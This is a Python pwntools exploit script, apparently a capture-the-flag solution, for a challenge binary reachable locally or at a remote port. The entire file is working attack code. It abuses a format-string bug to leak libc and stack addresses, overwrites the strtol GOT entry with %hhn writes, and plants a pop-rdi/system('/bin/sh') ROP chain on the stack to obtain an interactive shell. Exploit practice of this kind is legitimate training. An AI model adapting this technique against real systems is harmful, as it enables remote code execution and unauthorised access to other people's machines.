#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    input()
    # Leak libc address
    r.sendlineafter(b'>> ',b'%11$s\0\0\0' + p64(0x404030))
    libc_leak = u64(r.recv(6) + b'\0\0')
    info('Libc leak: ' + hex(libc_leak))
    libc.address = libc_leak - libc.sym['strtol']
    info('Libc address: ' + hex(libc.address))
    pause()
    def padding(string, l):
        while len(string) < l:
            string += b'A'
        return string
    def overwrite(start_addr, value):
        arr = []
        for i in range(8):
            arr.append((start_addr + i, value & 0xff))
            value >>= 8
        arr = sorted(arr, key=lambda x:x[1])
        info('Array of overwriting value and address: ')
        print(arr)
        payload = b''
        count = 0
        index = 49
        for adrr,val in arr:
            payload += b'A'*(val - count) + f'%{index}$hhn'.encode()
            count = val
            index += 1
        payload = padding(payload, 312)
        for addr, _ in arr: 
            payload += p64(addr)
        r.sendlineafter(b'>> ', payload)

    getenv = libc.sym['getenv']
    system = libc.sym['system']
    binsh = next(libc.search('/bin/sh\0'))
    poprdi = libc.address + 0x000000000002a3e5
    ret = poprdi + 1
    strtol_got = exe.got['strtol']
    info('Getenv address: ' + hex(getenv))
    info('System address: ' + hex(system))
    info('/bin/sh address: ' + hex(binsh))
    info('Ret address: ' + hex(ret))
    info('strtol got: ' + hex(strtol_got))

    overwrite(strtol_got, getenv)
    r.sendlineafter(b'>> ', b'%65$p')
    stack_leak = int(r.recv(14),16)
    info('Stack leak: ' + hex(stack_leak))
    rop_start_addr = stack_leak - 0x110
    info('rop start address: ' + hex(rop_start_addr))
    pause()
    overwrite(rop_start_addr, poprdi)
    overwrite(rop_start_addr + 8, binsh)
    overwrite(rop_start_addr + 16, ret)
    overwrite(rop_start_addr + 24, system)

    overwrite(exe.got['strtol'], libc.sym['strtol'])
    r.sendlineafter(b'>> ', b'%58$p')
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
